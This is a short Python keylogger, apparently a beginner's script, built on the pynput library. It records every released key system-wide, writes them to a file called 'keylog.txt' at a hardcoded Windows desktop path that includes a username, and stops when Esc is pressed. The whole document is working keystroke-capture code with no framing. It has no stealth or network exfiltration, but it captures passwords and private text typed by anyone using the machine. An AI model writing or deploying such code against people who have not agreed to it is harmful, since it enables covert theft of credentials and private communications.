from pynput.keyboard import Key, Listener
log_dir = open(r"C:/Users/ronni/OneDrive/Desktop/New folder/keylog.txt","w+")
def on_press(key):
    return True
def on_release(key):
    a=str(key)
    log_dir.write(a)
    if key == Key.esc:
        log_dir.close()
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
